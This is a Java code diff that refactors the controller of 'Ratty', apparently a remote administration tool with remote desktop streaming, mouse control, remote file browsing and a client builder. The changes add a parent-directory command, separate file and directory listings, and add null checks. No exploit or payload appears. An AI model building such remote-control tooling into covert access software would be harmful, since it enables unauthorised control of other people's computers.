@@ -90,12 +90,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String[] BUILDER_REMOVALS = {
 		"ping.wav",
 		"lato.ttf",
-		"gui_tree_icons.png",
-		"gui_icon.png",
-		"gui_menu_icons.png",
-		"gui_category_icons.png",
-		"gui_file_icons.png",
-		"gui_notification_icons.png",
+		"icons.png",
 		"language/lang_bsq.properties",
 		"language/lang_de.properties",
 		"language/lang_en.properties",
@@ -385,7 +380,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
-		final String path = client.fileBrowser.getSelectedFile().toString();
+		final String path = client.fileBrowser.getSelectedFilePath();
 		final FileInformationPacket packet = new FileInformationPacket(path);
 		
 		return packet;
@@ -456,17 +451,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FileRequestPacket createFileRequestPacket(final ServerClient client) {
-		final String path = client.fileBrowser.getSelectedFile();
-		final boolean directory = client.fileBrowser.isDirectory(path);
+		final String file = client.fileBrowser.getSelectedFile();
+		final boolean directory = client.fileBrowser.isDirectory(file);
 		
 		if (!directory) {
 			return null;
 		}
 		
+		final String path = client.fileBrowser.getSelectedFilePath();
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
 		client.fileBrowser.clearFiles();
-		client.fileBrowser.setDirectory(path);
+		client.fileBrowser.setDirectoryPath(path);
 		
 		return packet;
 	}
@@ -620,6 +616,20 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.fileBrowser.setVisible(true);
 	}
 	
+	private void fileBrowserDirectoryUp(final ServerClient client) {
+		final String directory = client.fileBrowser.getParentDirectory();
+		
+		if (directory == null) {
+			return;
+		}
+		
+		final FileRequestPacket packet = new FileRequestPacket(directory);
+		
+		client.fileBrowser.clearFiles();
+		client.fileBrowser.setDirectoryPath(directory);
+		client.connection.addPacket(packet);
+	}
+	
 	private MouseEventPacket createMouseEventPacket(final ServerClient client, final boolean flag) {
 		if (!client.isStreamingDesktop()) {
 			return null;
@@ -648,16 +658,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private FileRequestPacket createRootRequestPacket(final ServerClient client) {
 		final String root = client.fileBrowser.getSelectedRoot();
+		
+		if (root == null) {
+			return null;
+		}
+		
 		final FileRequestPacket packet = new FileRequestPacket(root);
 		
 		client.fileBrowser.clearFiles();
-		client.fileBrowser.setDirectory(root);
+		client.fileBrowser.setDirectoryPath(root);
 		
 		return packet;
 	}
 	
 	private void handleCommand(final ServerClient client, final String command) {
-		if (command == IRattyGui.FILES) {
+		if (command == IRattyGui.BROWSE_FILES) {
 			browseFiles(client);
 		} else if (command == IDisplayGui.CLOSE) {
 			stopDesktopStream(client);
@@ -671,6 +686,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			client.logger.setVisible(true);
 		} else if (command == ILoggingGui.CLEAR) {
 			client.logger.clear();
+		} else if (command == IFileBrowserGui.DIRECTORY_UP) {
+			fileBrowserDirectoryUp(client);
 		}
 	}
 	
@@ -777,11 +794,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
-		final String[] paths = packet.getFilePaths();
+		final String[] filePaths = packet.getFilePaths();
+		final String[] directoryPaths = packet.getDirectoryPaths();
 		
-		for (final String path : paths) {
-			client.fileBrowser.addFile(path);
+		for (final String file : filePaths) {
+			client.fileBrowser.addPath(file);
 		}
+		
+		for (final String directory : directoryPaths) {
+			client.fileBrowser.addDirectoryPath(directory);
+		}
+		
+		client.fileBrowser.update();
 	}
 	
 	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
@@ -898,6 +922,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		for (final String root : roots) {
 			client.fileBrowser.addRoot(root);
 		}
+		
+		client.fileBrowser.update();
 	}
 	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
